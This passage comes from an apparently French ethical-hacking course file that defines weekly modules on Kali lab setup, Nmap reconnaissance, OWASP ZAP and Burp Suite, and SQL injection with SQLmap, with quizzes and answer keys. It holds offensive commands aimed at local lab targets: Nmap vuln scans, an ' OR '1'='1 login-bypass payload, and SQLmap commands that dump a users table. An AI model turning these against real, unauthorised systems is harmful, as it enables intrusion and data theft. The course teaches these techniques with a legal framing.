    standards: ["PTES — Pre-Engagement Interactions", "MITRE ATT&CK — Tactique Reconnaissance (TA0043)", "EC-Council CEH — Module 1 : Introduction à l'Ethical Hacking"],
    steps: [
      { text: "Installer Kali Linux dans une machine virtuelle isolée (réseau NAT/Host-Only).", color: "blue" },
      { text: "Explorer et cataloguer les outils par catégorie (recon, web, exploitation, post-exploitation).", color: "orange" },
      { text: "Lire, comprendre et signer la charte éthique du hacker professionnel.", color: "blue" },
      { text: "Étudier le cadre légal applicable (autorisation écrite, périmètre, sanctions encourues).", color: "orange" },
      { text: "Livrable : charte éthique signée + capture d'écran de Kali opérationnel.", color: "red" }
    ],
    deliverable: "Une charte éthique signée (nom, date, engagement formel) accompagnée d'une capture d'écran de la VM Kali Linux à jour et opérationnelle, avec le résultat de la commande neofetch ou uname -a affiché dans le terminal.",
    tp: {
      title: "TP S13 — Construire son laboratoire offensif et signer la charte éthique",
      objectif: "Mettre en place un environnement Kali Linux isolé, opérationnel, et formaliser son engagement éthique avant toute manipulation offensive future.",
      duree: "90–120 minutes",
      materiel: ["Un hyperviseur (VirtualBox ou VMware Workstation/Player)", "L'image ISO officielle de Kali Linux (kali.org)", "Au moins 4 Go de RAM disponibles et 40 Go d'espace disque", "Modèle de charte éthique fourni par l'instructeur"],
      consignes: [
        "Télécharger l'image ISO officielle de Kali Linux depuis le site officiel kali.org (jamais un miroir tiers non vérifié).",
        "Créer une VM avec 2 vCPU, 4 Go de RAM minimum, 40 Go de disque, et configurer le réseau en mode Host-Only ou NAT Network (jamais en Bridge sur ce TP).",
        "Installer Kali Linux, créer un utilisateur non-root, puis exécuter la mise à jour du système (apt update && apt full-upgrade).",
        "Explorer le menu Applications et lister au moins 10 outils répartis sur 4 catégories différentes (recon, web, exploitation, post-exploitation), avec une phrase décrivant l'usage de chacun.",
        "Prendre un instantané (snapshot) de la VM propre, nommé « Kali - Etat initial », avant toute manipulation offensive future.",
        "Lire intégralement le modèle de charte éthique, la compléter avec son nom et la date, puis la signer (signature manuscrite scannée ou signature électronique).",
        "Rédiger un court paragraphe (5-10 lignes) expliquant pourquoi l'autorisation écrite est la condition absolue de toute action offensive légale."
      ],
      livrable: "Une capture d'écran de la VM Kali fonctionnelle affichant uname -a, la liste des 10 outils catalogués, et le fichier de la charte éthique signée (PDF ou image).",
      criteres: ["La VM Kali est installée, à jour, et isolée du réseau domestique/Internet en accès direct.", "Au moins 10 outils sont correctement catalogués par catégorie avec une description juste.", "La charte éthique est intégralement lue, complétée et signée.", "Le paragraphe de réflexion démontre une compréhension claire du cadre légal et de la nécessité d'une autorisation écrite."]
    },
    quiz: [
      { q: "Quelle est la condition absolue avant d'utiliser un outil offensif de Kali Linux sur un système ?", options: ["Avoir une connexion Internet rapide", "Disposer d'une autorisation écrite explicite du propriétaire du système", "Utiliser un VPN", "Avoir plus de 6 mois d'expérience"], correct: 1, explanation: "Le pentest n'est légal que dans le cadre d'une autorisation écrite explicite (contrat, ordre de mission, Rules of Engagement) définissant précisément le périmètre autorisé." },
      { q: "Pourquoi installer Kali Linux en machine virtuelle avec un réseau NAT ou Host-Only plutôt qu'en Bridge pour les TP de laboratoire ?", options: ["Parce que le mode Bridge est plus lent", "Pour empêcher tout trafic accidentel vers le réseau domestique ou Internet", "Parce que VirtualBox ne supporte pas le mode Bridge", "Pour économiser de la RAM"], correct: 1, explanation: "L'isolation réseau (NAT/Host-Only) garantit que les manipulations offensives restent confinées au laboratoire virtuel et ne peuvent pas atteindre accidentellement des systèmes tiers non autorisés." },
      { q: "Que signifie l'acronyme PTES ?", options: ["Penetration Testing Execution Standard", "Protocol Testing and Evaluation System", "Private Test Environment Setup", "Public Threat Evaluation Standard"], correct: 0, explanation: "Le PTES (Penetration Testing Execution Standard) est un référentiel méthodologique reconnu qui structure un test d'intrusion en sept phases, de la préparation contractuelle au rapport final." },
      { q: "Un scan de ports effectué « juste pour voir » sur un serveur d'entreprise tiers, sans autorisation, est :", options: ["Toujours légal tant qu'aucune donnée n'est modifiée", "Potentiellement une infraction pénale, même sans intention malveillante avérée", "Légal si le scan dure moins d'une minute", "Autorisé si l'outil utilisé est open source"], correct: 1, explanation: "L'accès ou la tentative d'accès non autorisé à un système, y compris un simple scan, peut être qualifié pénalement dans la plupart des juridictions, indépendamment de l'intention ou du résultat." },
      { q: "Parmi les catégories d'outils suivantes, laquelle regroupe Nmap et theHarvester dans le menu de Kali Linux ?", options: ["Post Exploitation", "Password Attacks", "Information Gathering", "Forensics"], correct: 2, explanation: "Nmap et theHarvester sont des outils de reconnaissance, classés dans la catégorie « Information Gathering », correspondant à la tactique Reconnaissance du framework MITRE ATT&CK." }
    ]
  },

  {
    id: "S14", week: 14, phase: 3,
    title: "Reconnaissance avec Nmap",
    level: "avance",
    duration: "Semaine 14 · ~8h",
    intro: "Toute intrusion légitime commence par la reconnaissance : cartographier une cible autorisée avant d'envisager la moindre exploitation. Nmap (Network Mapper) est l'outil de référence pour découvrir les hôtes actifs, les ports ouverts, les services exposés et parfois le système d'exploitation sous-jacent. Cette semaine se pratique exclusivement sur des cibles de laboratoire (VM Metasploitable, machines TryHackMe/HackTheBox autorisées).",
    objectives: [
      "Maîtriser la syntaxe de base et avancée de Nmap.",
      "Réaliser des scans de ports TCP et UDP adaptés au contexte.",
      "Détecter les versions de services et tenter une identification d'OS.",
      "Utiliser des scripts NSE (Nmap Scripting Engine) pour approfondir l'analyse.",
      "Produire un rapport de reconnaissance structuré et exploitable."
    ],
    definition: "Nmap est un scanner réseau open source permettant de découvrir les hôtes actifs sur un réseau, les ports ouverts, les services associés et, via des techniques de fingerprinting, le système d'exploitation. Le moteur de scripts NSE (Nmap Scripting Engine) étend ses capacités à la détection de vulnérabilités et à l'énumération avancée.",
    analogy: { title: "🗺️ Nmap comme le géomètre avant le chantier", text: "Avant de construire ou de rénover un bâtiment, un géomètre autorisé cartographie le terrain : accès, fondations, réseaux enterrés. Nmap joue ce rôle pour un système d'information : il dresse la carte des portes (ports) ouvertes et des services qui y répondent, sans jamais entrer par effraction." },
    keyTerms: [
      { term: "Port ouvert / fermé / filtré", def: "État d'un port réseau : ouvert (un service répond), fermé (aucun service mais l'hôte répond), filtré (un pare-feu bloque la réponse, état indéterminé)." },
      { term: "Fingerprinting", def: "Technique consistant à analyser les réponses réseau (bannières, comportements TCP/IP) pour déduire la version d'un service ou d'un système d'exploitation." },
      { term: "NSE (Nmap Scripting Engine)", def: "Moteur de scripts Lua intégré à Nmap permettant l'automatisation de tâches avancées : détection de vulnérabilités, énumération, exploitation légère." },
      { term: "Scan SYN (half-open)", def: "Technique de scan furtif envoyant un paquet SYN sans compléter la poignée de main TCP à trois voies, réduisant les traces dans les journaux applicatifs." }
    ],
    lesson: [
      { heading: "Rappel du cadre légal avant tout scan", html: "<p>Un scan Nmap, même passif en apparence, constitue une action de reconnaissance active qui laisse des traces réseau. Il ne doit être exécuté que contre des cibles pour lesquelles vous détenez une <strong>autorisation écrite</strong> : votre propre VM Metasploitable, une machine TryHackMe/HackTheBox, ou un environnement OWASP dédié (Juice Shop, DVWA). Scanner une IP publique tierce sans mandat est illégal, même sans exploitation ultérieure.</p>" },
      { heading: "Syntaxe de base de Nmap", html: "<p>Nmap s'utilise en ligne de commande avec une syntaxe modulaire : cible, type de scan, options de détection.</p><pre><code># Scan simple des ports les plus courants sur une cible de laboratoire\nnmap 192.168.56.101\n\n# Scan de tous les ports TCP (1-65535)\nnmap -p- 192.168.56.101\n\n# Scan rapide, top 100 ports\nnmap -F 192.168.56.101</code></pre><p>L'adresse <code>192.168.56.101</code> représente ici une VM Metasploitable dans un réseau Host-Only isolé — jamais une cible réelle.</p>" },
      { heading: "Scans de ports : TCP SYN, TCP Connect, UDP", html: "<p>Nmap propose plusieurs techniques de scan selon le niveau de privilège et la discrétion recherchée :</p><ul><li><strong>-sS</strong> : scan SYN furtif (nécessite les privilèges root), le plus utilisé en pentest.</li><li><strong>-sT</strong> : scan TCP Connect complet, plus bruyant mais ne nécessite pas de privilèges élevés.</li><li><strong>-sU</strong> : scan UDP, plus lent mais indispensable pour détecter des services comme DNS (53) ou SNMP (161).</li></ul><pre><code># Scan SYN furtif avec détection de version sur les ports courants\nsudo nmap -sS -sV 192.168.56.101\n\n# Scan UDP ciblé sur quelques ports critiques\nsudo nmap -sU -p 53,161,123 192.168.56.101</code></pre>" },
      { heading: "Détection de version et d'OS", html: "<p>Les options <code>-sV</code> et <code>-O</code> permettent d'identifier précisément les services exposés (nom, version) et de tenter une détection du système d'exploitation via l'analyse de la pile TCP/IP.</p><pre><code># Détection de version des services + tentative d'identification de l'OS\nsudo nmap -sV -O 192.168.56.101\n\n# Scan agressif combinant version, OS, scripts par défaut et traceroute\nsudo nmap -A 192.168.56.101</code></pre><p>La détection d'OS reste probabiliste : elle s'appuie sur des signatures TTL, tailles de fenêtre TCP et options d'en-tête, et peut se tromper sur des systèmes durcis ou virtualisés.</p>" },
      { heading: "Le moteur de scripts NSE", html: "<p>Le NSE permet d'exécuter des scripts Lua catégorisés (vuln, safe, auth, discovery...) pour approfondir l'analyse d'un service :</p><pre><code># Lister les scripts disponibles liés à http\nls /usr/share/nmap/scripts/ | grep http\n\n# Exécuter les scripts de détection de vulnérabilités connues\nsudo nmap --script vuln 192.168.56.101\n\n# Cibler un script précis (exemple : énumération SMB)\nsudo nmap --script smb-enum-shares -p 445 192.168.56.101</code></pre><p>Les scripts de la catégorie <code>vuln</code> peuvent générer un trafic important : à réserver strictement aux environnements de laboratoire.</p>" },
      { heading: "Structurer un rapport de reconnaissance", html: "<p>Un rapport de reconnaissance professionnel liste, par hôte : l'adresse IP, les ports ouverts, les services et versions identifiés, l'OS probable, et les pistes de vulnérabilités détectées par NSE — sans jamais exploiter à ce stade (phase distincte du PTES). Ce document sert de base à la phase d'analyse de vulnérabilités (S15-S16).</p>" }
    ],
    standards: ["MITRE ATT&CK — Technique T1046 (Network Service Discovery)", "PTES — Intelligence Gathering", "EC-Council CEH — Module 3 : Scanning Networks"],
    steps: [
      { text: "Réviser la syntaxe de base de Nmap et ses principales options.", color: "blue" },
      { text: "Réaliser des scans de ports TCP/UDP sur une cible de laboratoire autorisée.", color: "orange" },
      { text: "Détecter les versions de services exposés avec -sV.", color: "blue" },
      { text: "Tenter l'identification de l'OS avec -O et le scan agressif -A.", color: "orange" },
      { text: "Exploiter des scripts NSE pour approfondir l'énumération.", color: "blue" },
      { text: "Livrable : rapport de reconnaissance structuré.", color: "red" }
    ],
    deliverable: "Un rapport de reconnaissance (format Markdown ou PDF) documentant, pour une VM Metasploitable en laboratoire : hôtes actifs, ports ouverts, services/versions, OS probable, et résultats pertinents des scripts NSE utilisés.",
    tp: {
      title: "TP S14 — Cartographier une machine Metasploitable en laboratoire",
      objectif: "Réaliser une reconnaissance réseau complète et méthodique d'une cible de laboratoire autorisée à l'aide de Nmap, et en documenter les résultats.",
      duree: "90 minutes",
      materiel: ["VM Kali Linux opérationnelle (S13)", "VM Metasploitable 2 ou 3 (cible volontairement vulnérable, réseau Host-Only)", "Accès terminal avec privilèges sudo"],
      consignes: [
        "Rappeler le cadre légal : ce TP s'exécute uniquement contre la VM Metasploitable détenue en propre, isolée dans un réseau Host-Only, jamais contre une IP publique.",
        "Démarrer les deux VM (Kali et Metasploitable) sur le même réseau interne, puis identifier l'adresse IP de la cible (ip a ou netdiscover).",
        "Lancer un scan de découverte rapide (-F) puis un scan complet de tous les ports TCP (-p-) et noter les ports ouverts.",
        "Effectuer un scan de détection de version et d'OS combiné (-sV -O) sur les ports ouverts identifiés.",
        "Exécuter au moins deux scripts NSE pertinents (par exemple --script vuln et un script ciblé sur un service détecté, comme ftp-anon ou smb-enum-shares).",
        "Compiler l'ensemble des résultats dans un rapport de reconnaissance structuré : hôte, ports, services/versions, OS probable, vulnérabilités potentielles signalées par NSE.",
        "Conclure le rapport par une priorisation des services les plus préoccupants à approfondir lors des semaines suivantes."
      ],
      livrable: "Un rapport de reconnaissance au format Markdown ou PDF, incluant les commandes exécutées et une synthèse claire des résultats par service.",
      criteres: ["Les scans TCP et UDP sont exécutés correctement avec les options adaptées.", "La détection de version et d'OS est documentée avec ses résultats bruts.", "Au moins deux scripts NSE pertinents sont utilisés et interprétés.", "Le rapport final est structuré, lisible et rappelle explicitement le cadre légal du test."]
    },
    quiz: [
      { q: "Quelle option Nmap permet de réaliser un scan SYN furtif ?", options: ["-sT", "-sS", "-sU", "-sP"], correct: 1, explanation: "L'option -sS déclenche un scan SYN (half-open), qui n'achève pas la poignée de main TCP complète, réduisant les traces applicatives, et nécessite les privilèges root." },
      { q: "Pourquoi le scan UDP (-sU) est-il généralement plus lent que le scan TCP ?", options: ["Parce que UDP transmet plus de données", "Parce qu'un port UDP fermé ne renvoie souvent aucune réponse, forçant Nmap à attendre un timeout", "Parce que UDP nécessite une poignée de main à trois voies", "Parce que UDP est chiffré par défaut"], correct: 1, explanation: "UDP étant un protocole sans connexion, l'absence de réponse d'un port fermé oblige Nmap à attendre l'expiration d'un délai avant de conclure, ce qui ralentit considérablement le scan par rapport au TCP." },
      { q: "À quoi sert le moteur NSE (Nmap Scripting Engine) ?", options: ["À accélérer uniquement la vitesse de scan", "À exécuter des scripts Lua pour l'énumération avancée et la détection de vulnérabilités", "À chiffrer le trafic de scan", "À remplacer entièrement Metasploit"], correct: 1, explanation: "Le NSE permet d'exécuter des scripts Lua catégorisés (vuln, auth, discovery, etc.) qui étendent les capacités de Nmap au-delà du simple scan de ports, jusqu'à la détection de vulnérabilités connues." },
      { q: "Dans quel contexte est-il légitime de lancer un scan Nmap avec l'option --script vuln ?", options: ["Contre n'importe quelle IP publique trouvée sur Internet", "Uniquement contre une cible de laboratoire pour laquelle on dispose d'une autorisation explicite", "Contre le Wi-Fi d'un voisin pour tester ses compétences", "Contre un serveur d'entreprise sans en informer le propriétaire"], correct: 1, explanation: "Le scan de vulnérabilités génère un trafic actif potentiellement détecté comme malveillant ; il ne doit être utilisé que dans un cadre autorisé (laboratoire personnel, VM dédiée, plateforme d'entraînement légale)." },
      { q: "Que signifie un port signalé comme « filtré » par Nmap ?", options: ["Le port est ouvert et un service y répond normalement", "Le port est fermé et aucun service n'écoute", "Un pare-feu ou un filtre bloque la réponse, rendant l'état du port indéterminé", "Le port n'existe pas sur la machine cible"], correct: 2, explanation: "Un port « filtré » signifie que Nmap n'a pas reçu de réponse claire, généralement parce qu'un pare-feu bloque les paquets, empêchant de déterminer avec certitude si le port est ouvert ou fermé." }
    ]
  },

  {
    id: "S15", week: 15, phase: 3,
    title: "Sécurité des applications web (OWASP)",
    level: "avance",
    duration: "Semaine 15 · ~8h",
    intro: "Les applications web restent la surface d'attaque la plus exposée en 2026. Cette semaine plonge dans la méthodologie OWASP : utilisation d'OWASP ZAP pour l'analyse automatisée, exploration approfondie de l'OWASP Top 10, et prise en main du proxy d'interception Burp Suite. Toutes les manipulations se pratiquent sur des applications volontairement vulnérables et légales : OWASP Juice Shop, DVWA, WebGoat.",
    objectives: [
      "Installer et configurer OWASP ZAP pour l'analyse de sécurité web.",
      "Réaliser une analyse automatisée (active et passive) sur une application cible autorisée.",
      "Approfondir les 10 catégories de risques de l'OWASP Top 10 (2021).",
      "Utiliser Burp Suite comme proxy d'interception pour analyser le trafic HTTP/HTTPS.",
      "Produire un rapport d'analyse de vulnérabilités web structuré."
    ],
    definition: "OWASP ZAP (Zed Attack Proxy) est un scanner de sécurité web open source maintenu par l'OWASP Foundation, permettant l'analyse automatisée (spidering, scan actif/passif) d'applications web. Burp Suite est un proxy d'interception professionnel permettant d'observer, modifier et rejouer les requêtes HTTP entre un navigateur et une application cible.",
    analogy: { title: "🔍 ZAP et Burp comme l'inspecteur du bâtiment", text: "Un inspecteur du bâtiment autorisé vérifie systématiquement chaque porte, fenêtre et issue de secours d'un immeuble avant sa mise en service, en suivant une checklist normée. OWASP ZAP joue ce rôle pour une application web : il parcourt systématiquement chaque page et paramètre à la recherche de failles connues, listées dans une norme reconnue : l'OWASP Top 10." },
    keyTerms: [
      { term: "OWASP Top 10", def: "Classement de référence, mis à jour périodiquement par l'OWASP Foundation, des dix catégories de risques de sécurité applicative web les plus critiques (édition 2021 en vigueur)." },
      { term: "Proxy d'interception", def: "Outil se positionnant entre le navigateur et le serveur web, permettant de visualiser, intercepter et modifier chaque requête/réponse HTTP en transit." },
      { term: "Spidering (araignée)", def: "Technique d'exploration automatique d'une application web consistant à suivre tous les liens et formulaires accessibles pour cartographier sa structure." },
      { term: "Scan actif vs passif", def: "Le scan passif observe le trafic sans envoyer de requêtes modifiées (non intrusif) ; le scan actif envoie des charges de test pour provoquer et détecter des comportements vulnérables (intrusif)." }
    ],
    lesson: [
      { heading: "Cadre légal spécifique aux applications web", html: "<p>Les scans actifs de ZAP ou les manipulations Burp Suite envoient des charges (payloads) potentiellement perturbatrices pour une application. Ils ne doivent être exécutés que sur des cibles explicitement conçues pour l'entraînement : <strong>OWASP Juice Shop</strong>, <strong>DVWA</strong>, <strong>WebGoat</strong>, ou une application personnelle en environnement de développement local. Scanner un site de production tiers, même « juste pour tester », est une infraction.</p>" },
      { heading: "Installer et configurer OWASP ZAP", html: "<p>OWASP ZAP est préinstallé sur Kali Linux ou disponible via le site officiel zaproxy.org. Il s'utilise en mode graphique (Desktop) ou en ligne de commande pour l'automatisation.</p><pre><code># Lancer ZAP en mode graphique\nzaproxy &\n\n# Lancer un scan automatisé complet en ligne de commande contre une cible locale autorisée\nzap-full-scan.py -t http://localhost:3000 -r rapport_zap.html</code></pre><p>L'URL <code>http://localhost:3000</code> correspond ici à une instance locale d'OWASP Juice Shop lancée en conteneur Docker, jamais à un domaine tiers.</p>" },
      { heading: "Analyse automatisée : spider puis scan actif", html: "<p>La méthodologie ZAP classique se déroule en deux temps : d'abord le <em>spidering</em> pour cartographier l'application, puis le <em>scan actif</em> pour tester chaque paramètre découvert.</p><pre><code># Étape 1 : cartographier l'application (spider)\n# Menu ZAP > Automated Scan > URL cible > Attack\n\n# Étape 2 : lancer le scan actif sur les URLs découvertes\n# ZAP soumet automatiquement des charges de test (XSS, injection, etc.)\n# et classe les alertes par sévérité : High / Medium / Low / Informational</code></pre><p>Chaque alerte générée par ZAP référence directement une catégorie de l'OWASP Top 10, facilitant la priorisation des correctifs.</p>" },
      { heading: "OWASP Top 10 (2021) en profondeur", html: "<p>Le classement 2021 structure les risques applicatifs majeurs :</p><ul><li><strong>A01 – Broken Access Control</strong> : contrôle d'accès défaillant (ex. accès à des ressources d'un autre utilisateur).</li><li><strong>A02 – Cryptographic Failures</strong> : chiffrement absent ou faible de données sensibles.</li><li><strong>A03 – Injection</strong> : SQL, NoSQL, commande OS, LDAP (approfondi en S16).</li><li><strong>A05 – Security Misconfiguration</strong> : configurations par défaut, en-têtes de sécurité manquants.</li><li><strong>A07 – Identification and Authentication Failures</strong> : gestion de session ou d'authentification faible.</li></ul><p>Sur Juice Shop, chaque catégorie correspond à un ou plusieurs défis pédagogiques permettant de manipuler concrètement ces failles.</p>" },
      { heading: "Burp Suite : le proxy d'interception professionnel", html: "<p>Burp Suite (édition Community, gratuite) permet d'intercepter et modifier manuellement les requêtes HTTP, complémentaire à l'automatisation de ZAP.</p><pre><code># Configuration : navigateur pointé sur le proxy Burp (127.0.0.1:8080)\n# Installer le certificat CA Burp dans le navigateur pour intercepter le HTTPS\n\n# Dans l'onglet Proxy > Intercept : activer l'interception\n# Modifier une requête interceptée (ex. paramètre id=1 -> id=2) puis Forward\n\n# Utiliser Repeater pour rejouer et affiner une requête modifiée\n# Utiliser Intruder pour automatiser des tests par force brute sur un paramètre</code></pre><p>Burp est particulièrement utile pour tester manuellement le contrôle d'accès (A01) en modifiant des identifiants de session ou de ressource.</p>" },
      { heading: "Structurer un rapport d'analyse web", html: "<p>Un rapport d'analyse ZAP professionnel classe chaque vulnérabilité par sévérité, référence sa catégorie OWASP Top 10, décrit la requête de preuve de concept (PoC), et propose une recommandation de correction concrète — c'est cette structure qui sera exigée dans le livrable de la semaine.</p>" }
    ],
    standards: ["OWASP Top 10 (2021) — A01, A02, A03, A05, A07", "OWASP Testing Guide (WSTG)", "PTES — Vulnerability Analysis"],
    steps: [
      { text: "Installer et prendre en main OWASP ZAP sur Kali Linux.", color: "blue" },
      { text: "Lancer une analyse automatisée (spider + scan actif) sur Juice Shop/DVWA en local.", color: "orange" },
      { text: "Approfondir chaque catégorie pertinente de l'OWASP Top 10 (2021).", color: "blue" },
      { text: "Configurer et utiliser Burp Suite comme proxy d'interception manuel.", color: "orange" },
      { text: "Livrable : rapport d'analyse ZAP structuré par sévérité et catégorie OWASP.", color: "red" }
    ],
    deliverable: "Un rapport d'analyse OWASP ZAP (export HTML ou PDF) sur une application locale autorisée (Juice Shop ou DVWA), enrichi d'au moins deux observations manuelles réalisées via Burp Suite.",
    tp: {
      title: "TP S15 — Audit web automatisé et manuel sur OWASP Juice Shop",
      objectif: "Réaliser un audit de sécurité applicative complet combinant scan automatisé (ZAP) et interception manuelle (Burp Suite) sur une application volontairement vulnérable et légale.",
      duree: "120 minutes",
      materiel: ["VM Kali Linux avec OWASP ZAP et Burp Suite Community", "OWASP Juice Shop déployé en local (Docker : docker run -p 3000:3000 bkimminich/juice-shop)", "Navigateur configuré avec proxy local"],
      consignes: [
        "Rappeler le cadre légal : cette analyse ne cible que l'instance locale de Juice Shop déployée par l'apprenant, jamais une instance hébergée par un tiers sans autorisation.",
        "Déployer Juice Shop en local via Docker et vérifier son accessibilité sur http://localhost:3000.",
        "Lancer un Automated Scan complet dans ZAP contre cette URL locale et attendre la fin du spidering et du scan actif.",
        "Exporter le rapport ZAP (HTML) et identifier les 3 alertes de sévérité High les plus critiques, en les reliant à leur catégorie OWASP Top 10.",
        "Configurer Burp Suite comme proxy du navigateur, intercepter une requête de connexion, et tenter une modification manuelle d'un paramètre pour observer le contrôle d'accès (A01).",
        "Documenter chaque vulnérabilité identifiée (nom, sévérité, catégorie OWASP, requête de preuve, recommandation de correction).",
        "Compiler l'ensemble dans un rapport final structuré et cohérent."
      ],
      livrable: "Un rapport d'analyse combinant l'export ZAP et les observations Burp Suite, avec au minimum 5 vulnérabilités documentées et classées par sévérité.",
      criteres: ["Le scan ZAP est correctement exécuté et exporté sur une cible locale autorisée.", "Au moins 3 alertes critiques sont analysées et reliées à une catégorie précise de l'OWASP Top 10.", "Burp Suite est utilisé pour au moins une observation manuelle pertinente.", "Le rapport final est structuré, avec recommandations de correction concrètes pour chaque faille."]
    },
    quiz: [
      { q: "Que fait la phase de « spidering » dans OWASP ZAP ?", options: ["Elle chiffre le trafic HTTP", "Elle cartographie l'application en suivant automatiquement les liens et formulaires", "Elle bloque les attaques en temps réel", "Elle génère un rapport PDF final"], correct: 1, explanation: "Le spider explore automatiquement l'application en suivant les liens, formulaires et ressources accessibles, afin de construire une carte complète avant le scan actif." },
      { q: "Quelle catégorie de l'OWASP Top 10 (2021) correspond à un utilisateur pouvant accéder aux données d'un autre utilisateur en modifiant simplement un identifiant dans l'URL ?", options: ["A02 – Cryptographic Failures", "A01 – Broken Access Control", "A05 – Security Misconfiguration", "A03 – Injection"], correct: 1, explanation: "Ce scénario est un exemple classique de contrôle d'accès défaillant (A01 – Broken Access Control), où l'application ne vérifie pas correctement les droits de l'utilisateur sur la ressource demandée." },
      { q: "Quelle est la différence essentielle entre un scan passif et un scan actif dans ZAP ?", options: ["Le scan passif est payant, le scan actif est gratuit", "Le scan actif envoie des charges de test intrusives, le scan passif se contente d'observer le trafic", "Le scan passif ne fonctionne que sur HTTPS", "Il n'y a aucune différence fonctionnelle"], correct: 1, explanation: "Le scan passif analyse uniquement le trafic déjà généré sans envoyer de requêtes modifiées, tandis que le scan actif soumet volontairement des charges de test pour provoquer et détecter des comportements vulnérables." },
      { q: "À quoi sert principalement l'outil Repeater de Burp Suite ?", options: ["À générer automatiquement un rapport de vulnérabilités", "À rejouer et modifier manuellement une requête HTTP interceptée pour l'analyser précisément", "À scanner automatiquement tout un réseau", "À chiffrer les mots de passe de l'application testée"], correct: 1, explanation: "Repeater permet de renvoyer manuellement une requête interceptée, en modifiant ses paramètres, pour observer précisément la réponse du serveur — utile pour valider une hypothèse de vulnérabilité." },
      { q: "Pourquoi utiliser OWASP Juice Shop plutôt qu'un site de production réel pour ce TP ?", options: ["Parce que Juice Shop est plus rapide à charger", "Parce que c'est une application volontairement vulnérable, légale et conçue pour l'entraînement", "Parce que ZAP ne fonctionne que sur Juice Shop", "Parce que les sites de production n'ont jamais de vulnérabilités"], correct: 1, explanation: "Juice Shop est une application développée par l'OWASP spécifiquement pour l'entraînement à la sécurité applicative : elle contient des vulnérabilités intentionnelles et son usage est légal, contrairement à un audit non autorisé sur un site tiers." }
    ]
  },

  {
    id: "S16", week: 16, phase: 3,
    title: "Injections SQL avec SQLmap",
    level: "avance",
    duration: "Semaine 16 · ~8h",
    intro: "L'injection SQL demeure, des années après son apparition, l'une des vulnérabilités les plus dévastatrices : elle peut permettre de lire, modifier ou supprimer l'intégralité d'une base de données. Cette semaine explore son principe technique, l'automatisation de sa détection et de son exploitation avec SQLmap, puis surtout les mesures de prévention côté développement — sur des cibles de laboratoire exclusivement (DVWA, Juice Shop, Mutillidae).",
    objectives: [
      "Expliquer le principe technique d'une injection SQL et ses variantes.",
      "Installer et configurer SQLmap dans un environnement de laboratoire.",
      "Utiliser SQLmap pour détecter et exploiter une injection SQL de manière contrôlée.",
      "Analyser et interpréter les résultats produits par SQLmap.",
      "Proposer des mesures de prévention concrètes (requêtes préparées, validation des entrées)."
    ],
    definition: "Une injection SQL (SQLi) exploite une insuffisance de validation des entrées utilisateur pour injecter du code SQL arbitraire dans une requête destinée à la base de données. SQLmap est un outil open source d'automatisation de la détection et de l'exploitation des injections SQL, capable d'extraire des bases de données, de contourner des protections et, dans certains cas, d'obtenir un accès système.",
    analogy: { title: "📬 L'injection SQL comme une fausse déclaration glissée dans un formulaire", text: "Imaginez un formulaire administratif où un agent copie-colle littéralement le texte que vous écrivez dans une commande interne, sans jamais le vérifier. Si vous écrivez « annule tous les dossiers » à la place de votre nom, l'agent l'exécute tel quel. C'est exactement le principe d'une injection SQL : l'application fait une confiance aveugle à l'entrée utilisateur et l'insère directement dans une commande destinée à la base de données." },
    keyTerms: [
      { term: "Injection SQL In-band", def: "Variante où les résultats de l'injection sont directement visibles dans la réponse de l'application (ex. via UNION SELECT)." },
      { term: "Injection SQL Blind (aveugle)", def: "Variante où aucune donnée n'est directement affichée ; l'attaquant déduit l'information via des réponses booléennes vraies/fausses ou des délais de réponse (time-based)." },
      { term: "Requête préparée (prepared statement)", def: "Technique de développement séparant strictement le code SQL des données utilisateur, neutralisant structurellement l'injection SQL." },
      { term: "Dump de base de données", def: "Extraction complète ou partielle du contenu d'une base de données (tables, colonnes, enregistrements) réalisée lors de l'exploitation d'une injection SQL." }
    ],
    lesson: [
      { heading: "Rappel légal avant toute exploitation", html: "<p>SQLmap peut extraire des données sensibles (mots de passe, informations personnelles) en quelques minutes. Son usage est strictement réservé aux applications de laboratoire autorisées : <strong>DVWA</strong>, <strong>OWASP Juice Shop</strong>, <strong>Mutillidae</strong>, ou toute VM personnelle. Exploiter une injection SQL sur un site tiers, même découverte « par hasard », sans autorisation écrite constitue une infraction grave (accès et maintien frauduleux dans un système, extraction de données).</p>" },
      { heading: "Principe technique de l'injection SQL", html: "<p>Une requête vulnérable typique côté serveur ressemble à :</p><pre><code>-- Requête construite par concaténation, cote applicatif (vulnérable)\nSELECT * FROM users WHERE username = '$input' AND password = '$pass';</code></pre><p>Si <code>$input</code> vaut <code>' OR '1'='1</code>, la requête devient :</p><pre><code>SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '';</code></pre><p>La condition <code>'1'='1'</code> étant toujours vraie, l'authentification peut être contournée. C'est le principe fondamental de l'injection : faire interpréter une donnée comme du code.</p>" },
      { heading: "Installer et configurer SQLmap", html: "<p>SQLmap est préinstallé sur Kali Linux et s'utilise en ligne de commande contre une URL de laboratoire cible.</p><pre><code># Vérifier l'installation\nsqlmap --version\n\n# Détection basique d'une injection sur un paramètre GET (cible DVWA locale)\nsqlmap -u \"http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"PHPSESSID=xxx; security=low\" --batch</code></pre><p>Le paramètre <code>--batch</code> exécute SQLmap sans confirmations interactives, en utilisant les valeurs par défaut — pratique en environnement contrôlé.</p>" },
      { heading: "Utiliser SQLmap pour détecter et exploiter", html: "<p>Une fois une injection détectée, SQLmap permet d'énumérer progressivement la base de données :</p><pre><code># Lister les bases de données disponibles\nsqlmap -u \"http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"PHPSESSID=xxx; security=low\" --dbs\n\n# Lister les tables d'une base précise\nsqlmap -u \"...\" --cookie=\"...\" -D dvwa --tables\n\n# Extraire (dump) le contenu d'une table sensible\nsqlmap -u \"...\" --cookie=\"...\" -D dvwa -T users --dump</code></pre><p>Cette progression — bases, tables, colonnes, données — reproduit fidèlement la démarche d'un attaquant réel, mais ici strictement documentée à des fins pédagogiques.</p>" },
      { heading: "Analyser les résultats de SQLmap", html: "<p>SQLmap précise systématiquement le <em>type</em> d'injection détectée (booléenne, basée sur erreur, UNION-based, time-based) et le <em>payload</em> exact utilisé. L'analyse doit inclure : le paramètre vulnérable, la technique d'injection, le système de gestion de base de données identifié (MySQL, PostgreSQL...), et l'étendue des données accessibles — informations indispensables pour prioriser la remédiation.</p>" },
